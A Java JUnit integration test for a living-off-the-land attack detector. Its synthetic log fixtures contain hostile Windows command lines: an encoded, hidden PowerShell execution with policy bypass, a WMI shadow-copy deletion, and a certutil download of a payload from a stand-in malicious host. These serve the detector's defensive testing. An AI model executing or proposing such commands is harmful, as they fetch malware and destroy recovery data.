package com.example.loldetector.service;

import com.example.loldetector.detection.BehavioralDetectionEngine;
import com.example.loldetector.detection.rules.CertutilRule;
import com.example.loldetector.detection.rules.PowerShellRule;
import com.example.loldetector.detection.rules.WmiRule;
import com.example.loldetector.dto.AnalysisResponseDto;
import com.example.loldetector.dto.DashboardSummaryDto;
import com.example.loldetector.dto.LogEventDto;
import com.example.loldetector.dto.SecurityAlertDto;
import com.example.loldetector.entity.AnalysisRun;
import com.example.loldetector.entity.SecurityAlert;
import com.example.loldetector.exception.ResourceNotFoundException;
import com.example.loldetector.repository.AnalysisRunRepository;
import com.example.loldetector.repository.SecurityAlertRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest;

import java.time.LocalDateTime;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

@DataJpaTest
class AnalysisServiceIntegrationTest {

    @Autowired
    private AnalysisRunRepository analysisRunRepository;

    @Autowired
    private SecurityAlertRepository securityAlertRepository;

    private AnalysisService analysisService;
    private AlertService alertService;
    private BehavioralDetectionEngine detectionEngine;

    @BeforeEach
    void setUp() {
        analysisService = new AnalysisService(analysisRunRepository, securityAlertRepository);
        alertService = new AlertService(securityAlertRepository, analysisService);
        detectionEngine = new BehavioralDetectionEngine(List.of(
                new PowerShellRule(),
                new WmiRule(),
                new CertutilRule()
        ));
    }

    @Test
    @DisplayName("Test 1 & 2: Process synthetic PowerShell attack log and verify JPA persistence")
    void testPowerShellScenarioPersistence() {
        LogEventDto psEvent = new LogEventDto(
                "EVT-PS-001",
                LocalDateTime.now(),
                "powershell.exe",
                "cmd.exe",
                "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFA...",
                "NT AUTHORITY\\SYSTEM",
                "C:\\Windows\\System32\\powershell.exe"
        );

        AnalysisRun initialRun = analysisService.createInitialRun("test_ps.json", 1, 0);
        List<SecurityAlert> alerts = detectionEngine.analyzeEvents(List.of(psEvent));
        AnalysisResponseDto response = analysisService.completeAnalysisRun(initialRun, alerts);

        assertNotNull(response.getAnalysisId());
        assertEquals(1, response.getAlertCount());
        assertEquals("RULE-PS-001", response.getAlerts().get(0).getRuleId());
        assertEquals("HIGH", response.getAlerts().get(0).getSeverity());
    }

    @Test
    @DisplayName("Test 3: Process synthetic WMI shadow copy deletion and verify CRITICAL alert persistence")
    void testWmiScenarioPersistence() {
        LogEventDto wmiEvent = new LogEventDto(
                "EVT-WMI-001",
                LocalDateTime.now(),
                "wmic.exe",
                "powershell.exe",
                "wmic.exe shadowcopy delete",
                "NT AUTHORITY\\SYSTEM",
                "C:\\Windows\\System32\\wbem\\wmic.exe"
        );

        AnalysisRun initialRun = analysisService.createInitialRun("test_wmi.json", 1, 0);
        List<SecurityAlert> alerts = detectionEngine.analyzeEvents(List.of(wmiEvent));
        AnalysisResponseDto response = analysisService.completeAnalysisRun(initialRun, alerts);

        assertEquals(1, response.getAlertCount());
        assertEquals("RULE-WMI-001", response.getAlerts().get(0).getRuleId());
        assertEquals("CRITICAL", response.getAlerts().get(0).getSeverity());
        assertEquals("T1047", response.getAlerts().get(0).getMitreTechniqueId());
    }

    @Test
    @DisplayName("Test 4: Process synthetic Certutil download and verify HIGH alert persistence")
    void testCertutilScenarioPersistence() {
        LogEventDto certEvent = new LogEventDto(
                "EVT-CERT-001",
                LocalDateTime.now(),
                "certutil.exe",
                "cmd.exe",
                "certutil.exe -urlcache -split -f http://malicious.org/payload.png payload.exe",
                "CORP\\Admin",
                "C:\\Windows\\System32\\certutil.exe"
        );

        AnalysisRun initialRun = analysisService.createInitialRun("test_cert.json", 1, 0);
        List<SecurityAlert> alerts = detectionEngine.analyzeEvents(List.of(certEvent));
        AnalysisResponseDto response = analysisService.completeAnalysisRun(initialRun, alerts);

        assertEquals(1, response.getAlertCount());
        assertEquals("RULE-CERT-001", response.getAlerts().get(0).getRuleId());
        assertEquals("HIGH", response.getAlerts().get(0).getSeverity());
        assertEquals("T1105", response.getAlerts().get(0).getMitreTechniqueId());
    }

    @Test
    @DisplayName("Test 6 & 7: Verify retrieving alerts by Analysis Session ID")
    void testGetAlertsByAnalysisId() {
        LogEventDto event = new LogEventDto(
                "EVT-1", LocalDateTime.now(), "wmic.exe", "cmd.exe", "wmic.exe shadowcopy delete", "SYSTEM", "wmic.exe"
        );
        AnalysisRun run = analysisService.createInitialRun("session_test.json", 1, 0);
        List<SecurityAlert> alerts = detectionEngine.analyzeEvents(List.of(event));
        AnalysisResponseDto response = analysisService.completeAnalysisRun(run, alerts);

        List<SecurityAlertDto> sessionAlerts = alertService.getAlertsByAnalysisId(response.getAnalysisId());
        assertEquals(1, sessionAlerts.size());
        assertEquals("RULE-WMI-001", sessionAlerts.get(0).getRuleId());
    }

    @Test
    @DisplayName("Test 8: Verify Dashboard summary counts agree with stored results")
    void testDashboardSummaryCounts() {
        LogEventDto event = new LogEventDto(
                "EVT-1", LocalDateTime.now(), "wmic.exe", "cmd.exe", "wmic.exe shadowcopy delete", "SYSTEM", "wmic.exe"
        );
        AnalysisRun run = analysisService.createInitialRun("dash_test.json", 1, 0);
        analysisService.completeAnalysisRun(run, detectionEngine.analyzeEvents(List.of(event)));

        DashboardSummaryDto summary = analysisService.getDashboardSummary();
        assertEquals(1L, summary.getTotalAnalyses());
        assertEquals(1L, summary.getTotalEventsProcessed());
        assertEquals(1L, summary.getTotalAlertsGenerated());
        assertEquals(1L, summary.getAlertsBySeverity().get("CRITICAL"));
    }

    @Test
    @DisplayName("Test 9: Verify severity filtering works correctly")
    void testSeverityFiltering() {
        LogEventDto criticalEvent = new LogEventDto(
                "EVT-C", LocalDateTime.now(), "wmic.exe", "cmd.exe", "wmic.exe shadowcopy delete", "SYSTEM", "wmic.exe"
        );
        AnalysisRun run = analysisService.createInitialRun("filter_test.json", 1, 0);
        analysisService.completeAnalysisRun(run, detectionEngine.analyzeEvents(List.of(criticalEvent)));

        List<SecurityAlertDto> criticalAlerts = alertService.getAlerts("CRITICAL", null);
        assertEquals(1, criticalAlerts.size());

        List<SecurityAlertDto> lowAlerts = alertService.getAlerts("LOW", null);
        assertTrue(lowAlerts.isEmpty());
    }

    @Test
    @DisplayName("Test 10: Verify missing alert ID throws ResourceNotFoundException")
    void testMissingAlertIdThrowsException() {
        assertThrows(ResourceNotFoundException.class, () -> {
            alertService.getAlertById(999999L);
        });
    }
}
